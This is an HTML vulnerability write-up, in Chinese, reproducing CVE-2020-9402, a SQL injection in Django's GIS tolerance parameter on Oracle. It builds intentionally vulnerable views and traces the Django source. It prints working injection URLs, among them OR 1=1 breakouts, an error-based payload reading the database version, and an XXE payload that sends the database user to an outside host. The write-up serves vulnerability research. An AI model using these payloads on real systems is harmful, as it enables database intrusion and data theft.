<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
			.cs508254C{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;text-decoration: none;}
			.cs4B51D5E4{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs1C2E50E7{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.csE3F655E4{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs7FFD2630{color:#000000;background-color:transparent;font-family:Microsoft JhengHei UI;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs6FD73CFB{text-align:left;text-indent:0pt;margin:5pt 24pt 5pt 24pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2020-9402django-geo-sql注入"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2020-9402</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Django Geo sql</span><span class="csECDA2D3">注入</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Django 1.11.29</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">1.11.x</span><span class="cs9C1B1871">版本、</span><span class="cs8926E06">2.2.11</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">2.2.x</span><span class="cs9C1B1871">版本和</span><span class="cs8926E06">3.0.4</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">3.0.x</span><span class="cs9C1B1871">版本中存在</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入漏洞。攻击者可借助特制的</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">语句利用该漏洞查看、添加、修改或删除数据库中的信息。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Django 1.11.29</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">1.11.x</span><span class="cs9C1B1871">版本、</span><span class="cs8926E06">2.2.11</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">2.2.x</span><span class="cs9C1B1871">版本和</span><span class="cs8926E06">3.0.4</span><span class="cs9C1B1871">之前的</span><span class="cs8926E06">3.0.x</span><span class="cs9C1B1871">版本中存在</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">注入漏洞</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs9C1B1871">根据官网的修复</span><span class="cs8926E06">https://github.com/django/django/commit/6695d29b1c1ce979725816295a26ecc64ae0e927#diff-229e38ececbfc591f7a5e595bf5707c4</span><span class="cs9C1B1871">，可以看到问题出在</span><span class="cs8926E06">GIS</span><span class="cs9C1B1871">的查询上面</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image0.png" width="560" height="247" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image1.png" width="560" height="282" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">官方只修复了这两个位置，可以发现基本上是对于</span><span class="cs9FB05234">tolerance</span><span class="cs9C1B1871">参数进行判断是否为数字。那首先来了解一下</span><span class="cs8926E06">GIS</span><span class="cs9C1B1871">查询。</span></p><p class="cs40DD2BC9"><span class="cs8926E06">GIS</span><span class="cs9C1B1871">查询</span><span class="cs8926E06">API</span><span class="cs9C1B1871">是一个地理位置的查询</span><span class="cs8926E06">API</span><span class="cs9C1B1871">，提供用户存储精确</span><span class="cs8926E06">GPS</span><span class="cs9C1B1871">的位置的数据模块，属于一个空间数据库，我们可以通过如下的经纬度信息</span></p><p class="cs3A447A38"><span class="cs9FB05234">pnt = GEOSGeometry(&#39;POINT(-96.876369 29.905320)&#39;, srid=4326)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">&gt;&gt;&gt;SRID=4326;POINT (-96.876369 29.90532)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">来获得一个具体的定位信息</span><span class="cs8926E06">,</span><span class="cs9C1B1871">通过如下的模块来构建一个基本的地理信息存储</span></p><p class="cs3A447A38"><span class="cs9FB05234">from django.contrib.gis.db import models</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">class Names(models.Model):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;name = models.CharField(max_length=128)</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;def __str__(self):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return self.name</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">class Interstate(Names):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;path = models.LineStringField()</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">后台存储的时候发出</span><span class="cs8926E06">path</span><span class="cs9C1B1871">的信息为</span><span class="cs8926E06">json</span><span class="cs9C1B1871">数据，例如</span></p><p class="cs3A447A38"><span class="cs9FB05234">{&quot;type&quot;:&quot;LineString&quot;,&quot;coordinates&quot;:[[-8167.236601807093,-3286.248045708844],[-7896.285624495958,-3324.9553281818644],[1083.8039092445451,-654.1528375435246]]}</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image2.png" width="560" height="399" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">我们就获得了一个基本的地理位置数据</span><span class="cs8926E06">,</span><span class="cs9C1B1871">同理，通过构造一个聚合的查询方法</span></p><p class="cs3A447A38"><span class="cs9FB05234">def vuln(request):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;q = request.GET.get(&#39;q&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;qs=Interstate.objects.annotate(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d=Distance(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Point(-0.0733675346842369, -0.0295208671625432, srid=4326),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Point(0.009735976166628611, -0.00587635491086091, srid=4326),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;tolerance = q, # default 0.05</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;).filter(d=D(m=1)).values(&#39;name&#39;)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因为官网文档找不到如何构造</span><span class="cs8926E06">Point</span><span class="cs9C1B1871">查询，因此为了省事，直接写死了</span><span class="cs8926E06">Point</span><span class="cs9C1B1871">数值。。</span><span class="cs8926E06">srid</span><span class="cs9C1B1871">为空间参考的投影设置，默认值为</span><span class="cs8926E06">4326</span><span class="cs9C1B1871">。其中</span><span class="cs9FB05234">tolerance</span><span class="cs9C1B1871">是对于</span><span class="cs8926E06">oracle</span><span class="cs9C1B1871">特殊存在的一个键值，其作用是基本你的容错率，详细的信息可以参考</span><span class="cs8926E06"><a class="cs508254C" href="https://docs.oracle.com/en/database/oracle/oracle-database/18/spatl/spatial-concepts.html#GUID-CE10AB14-D5EA-43BA-A647-DAC9EEF41EE6"><span class="cs4B51D5E4">oracle</span><span class="cs1C2E50E7">官方文档</span></a></span><span class="cs9C1B1871">。对应的查询语句为</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT &quot;APP_NAMEDMODEL&quot;.&quot;NAME&quot; FROM &quot;APP_INTERSTATE&quot; INNER JOIN &quot;APP_NAMEDMODEL&quot; ON (&quot;APP_INTERSTATE&quot;.&quot;NAMEDMODEL_PTR_ID&quot; = &quot;APP_NAMEDMODEL&quot;.&quot;ID&quot;) WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (-0.0733675346842369 -0.0295208671625432),4326), SDO_GEOMETRY(POINT (0.009735976166628611 -0.00587635491086091),4326), 0.05) = &nbsp;1.0 FETCH FIRST 21 ROWS ONLY;</span></p><p class="cs40DD2BC9"><span class="cs5BEC2C28">0x02</span><span class="csE3F655E4">代码分析</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">首先从传入一个</span><span class="cs8926E06">url</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1:8000/vuln/?q=20) = 1 OR 1=1 OR (1%2B1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">从</span><span class="cs9FB05234">annotate</span><span class="cs9C1B1871">聚合函数开始跟进，同普通的</span><span class="cs8926E06">model</span><span class="cs9C1B1871">函数查询一样，</span><span class="cs8926E06">gis</span><span class="cs9C1B1871">查询虽然拥有着单独的</span><span class="cs8926E06">model</span><span class="cs9C1B1871">模块，但依旧还是依靠着普通</span><span class="cs8926E06">model</span><span class="cs9C1B1871">中进行过滤和查询。从</span><span class="cs8926E06">gis</span><span class="cs9C1B1871">的</span><span class="cs8926E06">model</span><span class="cs9C1B1871">文件夹中的</span><span class="cs9FB05234">__init__.py</span><span class="cs9C1B1871">文件中看</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image3.png" width="560" height="277" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">主要的查询依然调用的是</span><span class="cs8926E06">django</span><span class="cs9C1B1871">最基本的</span><span class="cs8926E06">db</span><span class="cs9C1B1871">方法，而其中单独定义了</span><span class="cs9FB05234">function</span><span class="cs9C1B1871">方法等一些对地理位置插叙独特的方法。程序运行到</span><span class="cs9FB05234">/django/db/models/manager.py</span><span class="cs9C1B1871">文件中的</span><span class="cs9FB05234">_get_queryset_methods</span><span class="cs9C1B1871">后，获取到</span><span class="cs8926E06">tolerant</span><span class="cs9C1B1871">参数之后便直接进入到</span><span class="cs8926E06">gis</span><span class="cs9C1B1871">模块中进行查询</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image4.png" width="560" height="136" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">继而进入到</span><span class="cs9FB05234">django/contrib/gis/measure.py</span><span class="cs9C1B1871">文件中的</span><span class="cs9FB05234">MeasureBase</span><span class="cs9C1B1871">类中进行方法调用，那么后面的方法分析可以跳过，因此直接来到漏洞代码段。先来看</span><span class="cs8926E06">gis API</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">functions</span><span class="cs9C1B1871">函数，在</span><span class="cs8926E06">as_oracle</span><span class="cs9C1B1871">方法这一段</span></p><p class="cs3A447A38"><span class="cs9FB05234">def as_oracle(self, compiler, connection, **extra_context):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;tol = self.extra.get(&#39;tolerance&#39;, self.tolerance)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return self.as_sql(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;compiler, connection,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;template=&quot;%%(function)s(%%(expressions)s, %s)&quot; % tol,</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;**extra_context</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span></p><p class="cs40DD2BC9"><span class="cs9FB05234">tolerance</span><span class="cs8926E06"> </span><span class="cs9C1B1871">从</span><span class="cs8926E06">self.extra.get</span><span class="cs9C1B1871">导入，该方法会搜索全局变量的值，如果该值不存在，则直接设置为</span><span class="cs8926E06">0.05</span><span class="cs9C1B1871">，并且将其直接传入到新的变量中。之后则不对</span><span class="cs8926E06">tol</span><span class="cs9C1B1871">进行任何处理直接拼接到</span><span class="cs8926E06">template</span><span class="cs9C1B1871">字符串中并且传入</span><span class="cs9FB05234">as_sql</span><span class="cs9C1B1871">方法。那么官方对于</span><span class="cs8926E06">as_sql</span><span class="cs9C1B1871">的文档是，此方法需要一个</span><span class="cs8926E06">SQLCompiler</span><span class="cs9C1B1871">对象，位于</span><span class="cs9FB05234">django/db/models/sql/compiler.py</span><span class="cs9C1B1871">文件中。而我们只需要知道在该对象中有一个</span><span class="cs9FB05234">compile()</span><span class="cs9C1B1871">方法，该方法可以返回一个包含</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">字符串的元祖，而</span><span class="cs8926E06">SQLComiler</span><span class="cs9C1B1871">对象中的</span><span class="cs8926E06">query</span><span class="cs9C1B1871">变量则是存储直接进行</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">查询语句的</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">命令。从而两个</span><span class="cs8926E06">Point</span><span class="cs9C1B1871">分别进入</span><span class="cs9FB05234">compile</span><span class="cs9C1B1871">方法中进行拼接</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image5.png" width="560" height="182" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">不知道为什么，用</span><span class="cs8926E06">pycharm</span><span class="cs9C1B1871">在</span><span class="cs8926E06">as_oracle</span><span class="cs9C1B1871">下断点的时候，第一次到达</span><span class="cs8926E06">SQLCompiler</span><span class="cs9C1B1871">的时候，</span><span class="cs8926E06">pycharm</span><span class="cs9C1B1871">不会在</span><span class="cs8926E06">as_oracle</span><span class="cs9C1B1871">函数中停下来，而是在第二次查询的时候才会停，但是经过测试确实是在进入</span><span class="cs8926E06">SQLCompiler</span><span class="cs9C1B1871">之前调用过</span><span class="cs8926E06">as_orcle</span><span class="cs9C1B1871">函数，可能是</span><span class="cs8926E06">pycharm</span><span class="cs9C1B1871">没有正确识别重载函数吧。之后</span><span class="cs8926E06">template</span><span class="cs9C1B1871">构造模版也因此进入到</span><span class="cs9FB05234">expression.py</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">as_sql</span><span class="cs9C1B1871">函数中进行字符串构造</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image6.png" width="560" height="398" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">因此最后进入</span><span class="cs8926E06">oracle</span><span class="cs9C1B1871">的命令语句是</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT &quot;APP_NAMEDMODEL&quot;.&quot;NAME&quot; FROM &quot;APP_INTERSTATE&quot; INNER JOIN &quot;APP_NAMEDMODEL&quot; ON (&quot;APP_INTERSTATE&quot;.&quot;NAMEDMODEL_PTR_ID&quot; = &quot;APP_NAMEDMODEL&quot;.&quot;ID&quot;) WHERE SDO_GEOM.SDO_DISTANCE(SDO_GEOMETRY(POINT (-0.0733675346842369 -0.0295208671625432),4326), SDO_GEOMETRY(POINT (0.009735976166628611 -0.00587635491086091),4326), 0.05) = 1 OR 1=1 &nbsp;OR (1+1) = 1.0 FETCH FIRST 21 ROWS ONLY;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image7.png" width="560" height="184" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">带入数据库中查询</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image8.png" width="560" height="91" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image9.png" width="560" height="193" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">官方修复的方法就是加入</span><span class="cs8926E06">Value</span><span class="cs9C1B1871">函数，判断传入的值是否为数字，否的话直接报错推出。那么第二个注入点就是</span><span class="cs9FB05234">Union</span><span class="cs9C1B1871">了，建立</span><span class="cs8926E06">Model</span></p><p class="cs3A447A38"><span class="cs9FB05234">class City(Names):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;point = models.PointField() &nbsp;# </span><span class="cs7FFD2630">点模块</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">编辑传入的参数为</span></p><p class="cs3A447A38"><span class="cs9FB05234">{&quot;type&quot;:&quot;Point&quot;,&quot;coordinates&quot;:[13250.226757682816,68815.69380603009]}</span></p><p class="cs40DD2BC9"><span class="cs8926E06">view</span><span class="cs9C1B1871">中设置查询</span></p><p class="cs3A447A38"><span class="cs9FB05234">from django.contrib.gis.db.models import Union</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">def vuln2(request):</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;q = request.GET.get(&#39;q&#39;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;res = City.objects.aggregate(</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Union(&#39;point&#39;, tolerance=q),</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;&nbsp;return HttpResponse(res)</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">输入</span><span class="cs8926E06">url</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://127.0.0.1:8000/vuln2?q=0.05)))%2C%20(((1</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">首先看结果，得到的</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">查询语句为</span></p><p class="cs3A447A38"><span class="cs9FB05234">SELECT SDO_UTIL.TO_WKBGEOMETRY(SDO_AGGR_UNION(SDOAGGRTYPE(&quot;APP_CITY&quot;.&quot;POINT&quot;,0.05))), (((1))) AS &quot;POINT__UNION&quot; FROM &quot;APP_CITY&quot;;</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image10.png" width="560" height="85" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">该</span><span class="cs8926E06">aggregate</span><span class="cs9C1B1871">查询方法是</span><span class="cs8926E06">GIS</span><span class="cs9C1B1871">查询特定的一种查询方法，为的是与地理查询的语句做适配</span><span class="cs8926E06">,</span><span class="cs9C1B1871">用法跟原模块的方法类似。因此跟进</span><span class="cs8926E06">GIS</span><span class="cs9C1B1871">模块中的聚合查询方法，位于</span><span class="cs9FB05234">django/contrib/gis/db/models/aggregates.py</span><span class="cs9C1B1871">文件内的</span><span class="cs8926E06">as_oracle</span><span class="cs9C1B1871">方法。</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image11.png" width="560" height="65" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">同样</span><span class="cs8926E06">tolerance</span><span class="cs9C1B1871">没有做任何检查直接传入了</span><span class="cs8926E06">template</span><span class="cs9C1B1871">模版语句中，原理与上面</span><span class="cs8926E06">annotate</span><span class="cs9C1B1871">查询过程一致。利用有大致两个方法</span><span class="cs8926E06"><br/></span><span class="cs9C1B1871">报错注入</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://localhost:8000/test/?q=20) = 1 OR (select utl_inaddr.get_host_name((SELECT version FROM v%24instance)) from dual) is null%20 OR (1%2B1</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image12.png" width="560" height="106" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs8926E06">CVE-2014-6577<br/></span><span class="cs9C1B1871">因为</span><span class="cs8926E06">Django</span><span class="cs9C1B1871">自</span><span class="cs8926E06">2.0</span><span class="cs9C1B1871">以后支持的</span><span class="cs8926E06">oracle</span><span class="cs9C1B1871">版本为</span><span class="cs8926E06">12</span><span class="cs9C1B1871">以上，因此可以尝试</span><span class="cs8926E06">oracle XXE</span><span class="cs9C1B1871">来进行</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">的注入。同时因为在</span><span class="cs8926E06">SQL</span><span class="cs9C1B1871">处理的过程中有三次利用</span><span class="cs8926E06">%</span><span class="cs9C1B1871">的模版跳转，因此需要在</span><span class="cs8926E06">XMLpayload</span><span class="cs9C1B1871">中的</span><span class="cs8926E06">%</span><span class="cs9C1B1871">替换为</span><span class="cs8926E06">%%%%</span><span class="cs9C1B1871">，</span><span class="cs8926E06">payload</span><span class="cs9C1B1871">为</span></p><p class="cs3A447A38"><span class="cs9FB05234">http://localhost:8000/test/?q=20) = 1 OR (select%20extractvalue(xmltype(&#39;%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%3F%3E%3C!DOCTYPE%20root%20%5B%20%3C!ENTITY%20%25%25%25%25%20remote%20SYSTEM%20%22http%3A%2F%2Fdocker.for.mac.host.internal%3A9000%2F&#39;%7C%7C(SELECT%20user%20from%20dual)%7C%7C&#39;%22%3E%20%25%25%25%25remote%3B%5D%3E&#39;)%2C&#39;%2Fl&#39;)%20from%20dual)%20is%20not%20null OR (1%2B1</span></p><p class="cs40DD2BC9"><span><img src="Web安全/Django/%ef%bc%88CVE-2020-9402%ef%bc%89Django%20Geo%20sql%e6%b3%a8%e5%85%a5_files/image13.png" width="560" height="129" alt="" style="border-width:0px;" /></span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">命令执的话因为是</span><span class="cs8926E06">docker</span><span class="cs9C1B1871">起的</span><span class="cs8926E06">oracle</span><span class="cs9C1B1871">所以没有设置</span><span class="cs8926E06">JAVA</span><span class="cs9C1B1871">的环境，暂时也不能判定有没有，以后再研究看看。</span></p><h2 class="cs868C439D">
			<a name="参考链接"><span class="cs83F14626">参考链接</span></a></h2>
		<p class="cs6FD73CFB"><span class="cs8926E06">https://xz.aliyun.com/t/7403</span></p></body>
</html>
